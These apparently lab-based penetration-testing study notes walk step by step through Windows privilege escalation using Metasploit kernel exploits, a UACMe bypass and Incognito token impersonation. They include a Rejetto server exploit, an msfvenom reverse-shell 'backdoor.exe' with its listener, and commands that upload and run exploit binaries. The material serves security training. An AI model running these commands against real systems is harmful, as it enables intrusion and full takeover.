# Windows Kernel Exploits

## Privilege Escalation
- Privilege Escalation involves exploiting vulnerabilities or misconfigurations to elevate access from a standard user to one with administrative or root privileges.
- This is critical in a penetration test to gain full control of a system after an initial compromise.
- Once a foothold is gained, escalating privileges allows you to perform tasks that require higher-level access.

## Windows Kernel
- The Kernel is the core component of an operating system, managing system resources and hardware interactions.
- **Windows NT Kernel**: Used by all versions of Microsoft Windows, with two main operation modes:
  - **User Mode**: Limited access to system resources, typically for standard applications and services.
  - **Kernel Mode**: Full access to system resources, used by the OS to manage hardware and execute critical system functions.
  
- Exploiting the Windows kernel allows code execution with the highest system privileges, potentially leading to full control over the target system.

## Windows Kernel Exploitation
- **Targeting Vulnerabilities**: Windows kernel exploits focus on specific vulnerabilities to execute code with elevated privileges.
- **Privilege Escalation Process**:
  - Identify kernel vulnerabilities.
  - Download, compile, and transfer kernel exploits to the target system.

## Tools & Environment:
- **Windows Exploit Suggester**: Compares the target's patch levels against a vulnerability database to detect missing patches and potential exploits.
- **Windows-Kernel-Exploits**: A collection of Windows Kernel exploits sorted by CVE.

## Demo

1. **List Active Sessions**  
   `sessions`  
   - Lists all active sessions. Identifies available sessions, such as a PowerShell or Meterpreter session.

2. **Attempt Privilege Escalation with Meterpreter**  
   `getsystem`  
   - Attempts to elevate privileges to system level within the current session.

3. **Search for the Exploit Suggester Module**  
   `search suggester`  
   - Searches for modules related to exploit suggestion in Metasploit. Prepares to use the Windows Exploit Suggester.

4. **Select the Exploit Suggester Module**  
   `use 0`  
   - Selects the first module from the search results.

5. **Show Module Options**  
   `show options`  
   - Displays configurable options for the selected module.

6. **List Active Sessions Again**  
   `sessions`  
   - Lists sessions to identify the session number needed for further exploitation.

7. **Run the Exploit Suggester**  
   `run`  
   - Enumerates vulnerabilities on the target system and suggests applicable Metasploit modules.

8. **Use the Suggested Kernel Exploit**  
   `use exploit/windows/local/ms16_014_wmi_recv_notif`  
   - Loads the specific kernel exploit module for privilege escalation.

9. **Show Exploit Options**  
   `show options`  
   - Displays the settings required for the loaded exploit module.

10. **Set the Session ID**  
    `set SESSION 3`  
    - Specifies the session to use for the exploit. Adjust according to the active session ID.

11. **Set Local Port**  
    `set LPORT 4422`  
    - Configures the local port for the reverse shell connection.

12. **Execute the Kernel Exploit**  
    `exploit`  
    - Runs the exploit, attempting to gain elevated privileges on the target system.

13. **Check User Identity Post-Exploitation**  
    `getuid`  
    - Confirms the current user’s identity to verify successful privilege escalation.

14. **Background the Current Session**  
    `background`  
    - Backgrounds the current session, keeping it active while allowing further actions.

15. **Switch to the Unprivileged Session**  
    `session 3`  
    - Switches to an unprivileged session for verification.

16. **Check User Identity Again**  
    `getuid`  
    - Verifies the identity in the unprivileged session.

### Using Windows Exploit Suggester

1. **Open a Shell on the Target**  
   `shell`  
   - Drops to a command shell on the target system.

2. **Gather System Information**  
   `systeminfo`  
   - Collects system information, including installed hotfixes, to assess vulnerabilities.

3. **Copy System Information to a Text File**  
   - Create a text file (`win7.txt`) to save `systeminfo` output for further analysis.

4. **Update the Exploit Suggester Database**  
   `./windows-exploit-suggester.py --update`  
   - Updates the vulnerability database for the Windows Exploit Suggester tool.

5. **Run the Exploit Suggester**  
   `./windows-exploit-suggester.py --database 20xx-xx-xx-mssb.xls --systeminfo ~/Desktop/win7.txt`  
   - Compares the system info with the database to suggest applicable exploits.

6. **Transfer the Exploit to the Target System**  
   `upload ~/Downloads/41015.exe`  
   - Uploads the selected exploit binary to the target system.

7. **Navigate to the Temp Directory**  
   `cd C:\\tEMP`  
   - Moves to the temporary directory on the target system, a safe location to execute the exploit.

8. **Execute the Exploit**  
   `.\41015.exe`  
   - Runs the uploaded kernel exploit on the target system.

9. **Check for Elevated Privileges**  
   `whoami`  
   - Confirms successful privilege escalation by checking the user identity, expecting "nt authority\system".
  
  THis metasploit module can be used to identify kernel exploits on a target:
  multi/recon/local_exploit_suggester


# Bypassing UAC With UACMe

- **User Account Control (UAC)**: A Windows security feature introduced in Windows Vista to prevent unauthorized changes to the operating system. It ensures that changes require approval from an administrator or a user in the local administrators group.
- A non-privileged user executing a program with elevated privileges will see a UAC prompt, while a privileged user will see a consent prompt.
- Bypassing UAC allows execution of malicious executables with elevated privileges.

## Bypassing UAC
- Access to a user account in the local administrators group is needed.
- UAC can execute programs with administrative privileges but may prompt for confirmation depending on its integrity level setting.
- The technique and tools used to bypass UAC depend on the Windows version.

## Bypassing UAC With UACME
- **UACMe**: An open-source tool used to bypass Windows UAC through various methods. The GitHub repository provides exploits for Windows 7 to Windows 10.
- It enables the execution of payloads with administrative privileges by abusing the Windows AutoElevate feature.
- The repository contains over 60 exploits for bypassing UAC, depending on the Windows version.

## Demo

1. **Identify the Target System**  
   `nmap [target IP]`  
   - Scans the target IP to find open ports and services. This helps in identifying the vulnerable HTTP file server.

2. **Start Metasploit Framework**  
   `service postgresql start && msfconsole`  
   - Starts the PostgreSQL service required by Metasploit and launches the Metasploit console to exploit vulnerabilities.

3. **Set Global Target IP**  
   `setg rhosts [target IP]`  
   - Sets the target IP globally in Metasploit to avoid retyping it for each module.

4. **Search for Vulnerable Payload**  
   `search rejetto`  
   - Searches for the Rejetto file server vulnerability in Metasploit modules.

5. **Select and Use the Exploit**  
   `use [found payload]`  
   - Loads the exploit module found for the Rejetto file server vulnerability.

6. **Run the Exploit**  
   `exploit`  
   - Executes the exploit to gain access to the target system.

7. **Perform Basic Enumeration**  
   - **Meterpreter Commands**:
     - `sysinfo`  
       - Displays system information, including OS version and build.
     - `pgrep explorer`  
       - Searches for the Explorer process on the target system.
     - `migrate 2448`  
       - Migrates the Meterpreter session to the specified process ID (2448).
     - `getuid`  
       - Shows the current user ID to verify the privileges.
     - `getprivs`  
       - Lists the privileges of the current user.

8. **Verify Administrative Privileges**  
   - **Shell Commands**:
     - `netuser`  
       - Lists user accounts on the target system.
     - `net localgroup administrators`  
       - Displays members of the local administrators group to confirm administrative access.

9. **Exit Meterpreter and Generate Payload**  
   `exit`  
   - Exits the Meterpreter session.
   - **Generate Payload**:  
     `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[own IP] LPORT=1234 -f exe > backdoor.exe`  
       - Creates a Meterpreter payload (backdoor.exe) for a reverse TCP connection.

10. **Upload Payload to Target**  
    `ls`  
    - Lists files in the current directory to verify the presence of `backdoor.exe`.
    - **Metasploit Console Commands**:
      - `use multi/handler`  
        - Loads the handler module to receive the reverse shell.
      - `set payload windows/meterpreter/reverse_tcp`  
        - Configures the payload type for handling the reverse TCP connection.
      - `set LHOST [own IP]`  
        - Sets the local IP address for receiving the reverse connection.
      - `set LPORT 1234`  
        - Sets the port number for the reverse connection.
      - `run`  
        - Starts the Metasploit handler to listen for incoming connections.

11. **Interact with the Meterpreter Session**  
    - **Meterpreter Commands**:
      - `pwd`  
        - Prints the current working directory.
      - `getuid`  
        - Verifies the current user ID.
      - `getprivs`  
        - Lists the privileges of the current user.
      - `cd C:\\`  
        - Changes the directory to C:\.
      - `mkdir Temp`  
        - Creates a new directory named Temp.
      - `cd Temp`  
        - Changes the directory to Temp.
      - `upload backdoor.exe`  
        - Uploads the generated payload to the target system.
      - `upload /root/Desktop/tools/UACME/Akagi64.exe`  
        - Uploads the Akagi64 executable from the local system to the target system.

12. **Bypass UAC and Execute Payload**  
    - **Meterpreter Commands**:
      - `shell`  
        - Opens a command shell on the target system.
      - **Shell Commands**:
        - `dir`  
          - Lists files in the current directory to confirm the presence of uploaded files.
        - **Bypass UAC**:
          `Akagi64.exe 23 C:\Temp\backdoor.exe`  
          - Executes the `backdoor.exe` with administrative privileges using the Akagi64 tool with method key 23.
        - **Verify Privileges**:
          - `getprivs`  
            - Lists the current privileges to ensure they are elevated.
          - `ps`  
            - Lists running processes, allowing migration to a high-privilege process like NT Authority\System.
          - `migrate 688`  
            - Migrates the Meterpreter session to process ID 688 (typically a high-privilege process).
          - `sysinfo`  
            - Displays system information to confirm successful privilege escalation.

# Access Token Impersonation

## Windows Access Tokens
- **Windows access tokens** are crucial elements in the Windows authentication process, managed by the Local Security Authority Subsystem Service (LSASS).
- An access token identifies the security context of a process or thread. It acts as a temporary key, similar to a web cookie, allowing users to access system resources without re-entering credentials.
- Access tokens are generated by the `winlogon.exe` process when a user successfully authenticates. The token includes the identity and privileges of the user account and is attached to the `userinit.exe` process. All child processes inherit a copy of this token, maintaining the same security context.
- Windows access tokens have varying security levels, determining the privileges they confer:
  - **Impersonate-level tokens**: Created through non-interactive logins, such as system services or domain logons. These can only impersonate tokens on the local system.
  - **Delegate-level tokens**: Created through interactive logins, such as traditional logins or remote access protocols like RDP. These tokens can be used to impersonate on any system.

## Windows Privileges
- The ability to impersonate access tokens depends on the privileges assigned to the exploited account and the available impersonation or delegation tokens.
- The required privileges for a successful impersonation attack are:
  - **SeAssignPrimaryToken**: Allows impersonation of tokens.
  - **SeCreateToken**: Allows creation of an arbitrary token with administrative privileges.
  - **SeImpersonatePrivilege**: Allows creation of a process under the security context of another user, typically with administrative privileges.

## The Incognito Module
- **Incognito** is a built-in meterpreter module, originally a standalone application, that facilitates the impersonation of user tokens after successful exploitation.
- Incognito can be used to list available tokens and impersonate them to elevate privileges.

## Demo

1. **Initial Setup and Exploitation**
   - Run an Nmap scan to identify open ports:
     ```
     nmap [target IP]
     ```
     - Port 80 is open, indicating a web server is running. Access the IP in a web browser to find the Rejetto HTTP file server.

   - Start PostgreSQL and Metasploit:
     ```
     service postgresql start && msfconsole
     ```

   - Search for the Rejetto exploit module:
     ```
     search rejetto
     ```

   - Use the identified module:
     ```
     use module 0
     ```

   - Show and configure the necessary options:
     ```
     show options
     set rhosts [target IP]
     set LHOST [own IP]
     set LPORT [desired port]
     ```

   - Launch the exploit:
     ```
     exploit
     ```

2. **Meterpreter Session and Privilege Escalation**
   - Gather system information:
     ```
     sysinfo
     ```

   - Identify the explorer process ID:
     ```
     pgrep explorer
     ```

   - Attempt to migrate to the explorer process (if running as an unprivileged user, this will fail):
     ```
     migrate 3512
     ```

   - Check the current user ID:
     ```
     getuid
     ```

   - List current privileges:
     ```
     getprivs
     ```

3. **Using Incognito for Token Impersonation**
   - Load the Incognito module:
     ```
     load incognito
     ```

   - List available tokens for impersonation:
     ```
     list_tokens
     ```

   - Impersonate the Administrator token:
     ```
     impersonate_token "ATTACKDEFENSE\Administrator"
     ```

   - Verify the new user ID:
     ```
     getuid
     ```

   - Check the new privileges:
     ```
     getprivs
     ```

   - Migrate to the explorer process after privilege escalation:
     ```
     migrate 3512
     ```

4. **Impersonating NT AUTHORITY\SYSTEM**
   - Generate and impersonate the NT AUTHORITY\SYSTEM token:
     ```
     impersonate_token "NT AUTHORITY\SYSTEM"
     ```

   - Verify the SYSTEM level access:
     ```
     getuid
     getprivs
     ```

5. **Obtaining the Flag**
   - After impersonating the Administrator token, the flag can be retrieved. Use the following command to impersonate and obtain the necessary privileges:
     ```
     impersonate_token ATTACKDEFENSE\\Administrator
     getuid
     ```

This documentation provides a step-by-step guide for access token impersonation, using both the Rejetto exploit and the Incognito module within Metasploit to elevate privileges on a Windows system.


